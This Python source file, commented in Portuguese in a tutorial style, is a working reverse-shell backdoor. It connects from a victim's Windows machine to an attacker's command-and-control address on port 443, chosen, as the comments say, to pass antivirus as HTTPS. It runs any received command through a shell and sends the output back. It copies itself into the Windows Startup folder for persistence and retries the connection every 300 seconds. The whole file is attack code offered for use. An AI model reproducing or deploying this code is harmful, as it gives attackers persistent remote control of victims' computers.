import socket
import subprocess
import threading    
import time
import os
# Atenção! É fundamental ter o ssh server instalado --> https://github.com/PowerShell/Win32-OpenSSH/releases
CCIP = "" #Endereço de IP
CCPORT = 443 #Essa é a porta de seguraça do http para fazer com que o antivírus veja que é um "https" e vai permitir

#LEMBRANDO: O computador da vítima que vai se conectar com a máquina do atacante!

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe") #Vai tornar o arquivo executavel
    os.system('copy {} \"%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'.format(exe_file)) #Colocamos este código, agora executável, para ser executado na inicialização do computador

def conn(CCIP, CCPORT):
    try:#a biblioteca "socket" permite a comunicação entre computadores através da rede usando o protocolo TCP/IP.
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client #retorna o objeto de soquete "client", que pode ser usado para enviar e receber dados através da conexão criada
    except Exception as error:
        print(error)


def cmd(client, data):
    try: 
        
        # Essa função recebe três argumentos:
        # o primeiro é a string do comando a ser executado, 
        # o segundo é o parâmetro "shell=True" que especifica que o comando deve ser executado em um shell, 
        # e o terceiro é o redirecionamento da entrada, saída e erro padrão do processo, que são definidos como o pipe do processo.
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        # Esse objeto é criado para controlar o processo filho que é criado com a execução do comando especificado no argumento "data"
        # Ele contém informações sobre o processo filho, incluindo seu estado atual e as saídas padrão do processo (saída, erro e entrada). É usado para acessar e gerenciar a saída do processo, incluindo a saída padrão e de erro.
        
        #A saída do processo é armazenada na variável "output" pela leitura do pipe da saída padrão e do pipe da saída de erro
        output = proc.stdout.read() + proc.stderr.read() 
        
        #A string de saída é codificada em bytes usando o método "b" antes de ser enviada, para garantir que seja enviada corretamente pela conexão de soquete.
        client.send(output + b"\n") 
    except Exception as error:
        print(error)
        
        
def cli(client):        #Checar se a conecção ainda existe
    try:
        while True:
            # a função aguarda a chegada de dados do servidor usando o método "recv()" do objeto cliente
            # O número "1024" especifica o tamanho máximo de dados que podem ser recebidos de uma vez,
            # e o método "decode()" é usado para converter os dados recebidos em uma string legível pelo Python.
            data = client.recv(1024).decode().strip()
            if data == ":\kill":
                return
            else:
            # Essa thread executa a "cmd()", que é responsável por executar o comando recebido no cliente e enviar a saída de volta para o servidor
                threading.Thread(target=cmd, args=(client, data)).start()
                
    except Exception as error:
        client.close()  #Fechar a conecção em caso de exceção
        
        
if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            print("\nTentando conexão novamente em 300 segundos\n")
            time.sleep(300)
            


